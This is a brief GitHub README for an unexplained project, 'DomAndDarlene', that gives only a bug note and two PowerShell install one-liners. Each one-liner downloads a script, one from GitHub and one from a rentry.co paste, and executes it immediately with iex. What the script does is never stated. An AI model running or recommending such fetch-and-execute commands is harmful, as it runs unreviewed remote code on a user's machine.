# DomAndDarlene
Run Away with me

## Powershell:
`iex (iwr raw.githubusercontent.com/RavenCraftInitaitives/DomAndDarlene/main/test1.ps1).Content`

Or,

`iex (iwr rentry.co/HotCarla/raw).content`

## Bugs:

powershell doesn't automatically exit after completion (All the commands are never completed). Maybe it's stuck at wait... For now, press Ctrl + C to exit powershell.
